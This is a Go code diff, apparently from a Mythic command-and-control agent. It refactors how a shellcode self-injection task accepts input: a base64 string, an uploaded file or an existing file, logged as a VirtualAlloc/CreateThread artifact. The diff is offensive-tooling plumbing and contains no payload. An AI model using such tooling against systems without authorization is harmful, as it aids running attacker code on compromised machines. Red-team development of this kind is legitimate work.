@@ -4,7 +4,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 	"github.com/MythicMeta/MythicContainer/logging"
@@ -84,12 +83,59 @@ func init() {
 				TaskID:  taskData.Task.ID,
 			}
 
+			// Check for direct base64 shellcode first (CLI/API usage).
+			// We check the actual arg value rather than ParameterGroupName to be
+			// robust against Mythic parameter group resolution edge cases.
+			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
+			if sc != "" {
+				// Validate it's actual base64
+				decoded, err := base64.StdEncoding.DecodeString(sc)
+				if err != nil {
+					response.Success = false
+					response.Error = "shellcode_b64 is not valid base64: " + err.Error()
+					return response
+				}
+				params := map[string]interface{}{"shellcode_b64": sc}
+				paramsJSON, _ := json.Marshal(params)
+				taskData.Args.SetManualArgs(string(paramsJSON))
+				displayParams := fmt.Sprintf("Shellcode: base64 (%d bytes)", len(decoded))
+				response.DisplayParams = &displayParams
+				createArtifact(taskData.Task.ID, "API Call", "VirtualAlloc/CreateThread (self-injection)")
+				return response
+			}
+
+			// File-based paths: get shellcode from Mythic file storage
 			var filename string
 			var fileContents []byte
 
-			switch strings.ToLower(taskData.Task.ParameterGroupName) {
-			case "default":
+			// Try "file" (new upload) first, then "filename" (existing file dropdown)
+			fileID, _ := taskData.Args.GetStringArg("file")
+			if fileID != "" {
+				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
+					AgentFileID: fileID,
+				})
+				if err != nil || !search.Success || len(search.Files) == 0 {
+					response.Success = false
+					response.Error = "Failed to find uploaded file"
+					return response
+				}
+				filename = search.Files[0].Filename
+				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
+					AgentFileID: fileID,
+				})
+				if err != nil || !getResp.Success {
+					response.Success = false
+					response.Error = "Failed to get file contents"
+					return response
+				}
+				fileContents = getResp.Content
+			} else {
 				filename, _ = taskData.Args.GetStringArg("filename")
+				if filename == "" {
+					response.Success = false
+					response.Error = "No shellcode provided (shellcode_b64, file, or filename required)"
+					return response
+				}
 				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
 					CallbackID:      taskData.Callback.ID,
 					Filename:        filename,
@@ -116,48 +162,6 @@ func init() {
 					return response
 				}
 				fileContents = getResp.Content
-
-			case "new file":
-				fileID, _ := taskData.Args.GetStringArg("file")
-				search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
-					AgentFileID: fileID,
-				})
-				if err != nil || !search.Success || len(search.Files) == 0 {
-					response.Success = false
-					response.Error = "Failed to find uploaded file"
-					return response
-				}
-				filename = search.Files[0].Filename
-				getResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
-					AgentFileID: fileID,
-				})
-				if err != nil || !getResp.Success {
-					response.Success = false
-					response.Error = "Failed to get file contents"
-					return response
-				}
-				fileContents = getResp.Content
-
-			case "cli":
-				sc, _ := taskData.Args.GetStringArg("shellcode_b64")
-				if sc == "" {
-					response.Success = false
-					response.Error = "shellcode_b64 parameter is empty"
-					return response
-				}
-				// Already base64, just pass through
-				params := map[string]interface{}{"shellcode_b64": sc}
-				paramsJSON, _ := json.Marshal(params)
-				taskData.Args.SetManualArgs(string(paramsJSON))
-				displayParams := fmt.Sprintf("Shellcode: base64 (%d chars)", len(sc))
-				response.DisplayParams = &displayParams
-				createArtifact(taskData.Task.ID, "API Call", "VirtualAlloc/CreateThread (self-injection)")
-				return response
-
-			default:
-				response.Success = false
-				response.Error = fmt.Sprintf("Unknown parameter group: %s", taskData.Task.ParameterGroupName)
-				return response
 			}
 
 			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)", filename, len(fileContents))
